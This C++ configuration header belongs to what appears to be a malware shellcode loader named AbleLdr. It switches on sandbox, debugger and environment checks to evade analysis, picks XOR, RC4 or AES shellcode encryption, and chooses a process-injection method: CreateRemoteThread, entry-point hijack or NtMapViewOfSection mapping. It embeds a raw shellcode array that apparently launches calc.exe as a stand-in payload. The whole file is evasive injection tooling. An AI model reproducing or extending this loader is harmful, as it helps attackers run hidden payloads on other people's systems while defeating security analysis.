#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1
#define SLEEP_METHOD 1

// Anti Debugging
#define DEBUG_IS_BEING_DEBUGGED 1
#define DEBUG_REMOTE_DEBUGGING 1

// Encryption
#define CONFIG_ENCRYPT_KEY "AbleKey"
#define CONFIG_ENCRYPT_IV "AbleKey"

#define CONFIG_ENCRYPTION_METHOD 1
#if CONFIG_ENCRYPTION_METHOD == 1
#define EncryptShellcode(shellcode, key, shellcode_len, key_len) encrypt::NoEncrypt(shellcode, key, sizeof(shellcode), sizeof(key)) // No Encryption
#elif CONFIG_ENCRYPTION_METHOD == 2
#define EncryptShellcode(shellcode, key, shellcode_len, key_len) encrypt::XorEncrypt(shellcode, key, sizeof(shellcode), sizeof(key)) // XOR Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 3
#define EncryptShellcode(shellcode, key, shellcode_len, key_len) encrypt::Rc4Encrypt(shellcode, key, sizeof(shellcode), sizeof(key)) // RC4 Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 4
#define EncryptShellcode(shellcode, key, shellcode_len, key_len) encrypt::AesEncrypt(shellcode, key, sizeof(shellcode), sizeof(key)) // AES Encrypt
#endif

// Obfuscation
#define CONFIG_OBFUSCATION_METHOD 1

// Payloads
#define CONFIG_PAYLOAD_SHELLCODE { 0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51, 0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18, 0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b, 0x32,0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff, 0xd7 }

// Execution Methods
#define CONFIG_EXECUTION_METHOD 1

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::CreateRemoteThreadInjection(phandle, shellcode, sizeof(shellcode))
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::HijackEntryPoint(phandle, shellcode, sizeof(shellcode))
#elif CONFIG_EXECUTION_METHOD == 3
#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, sizeof(shellcode))
#endif

#endif 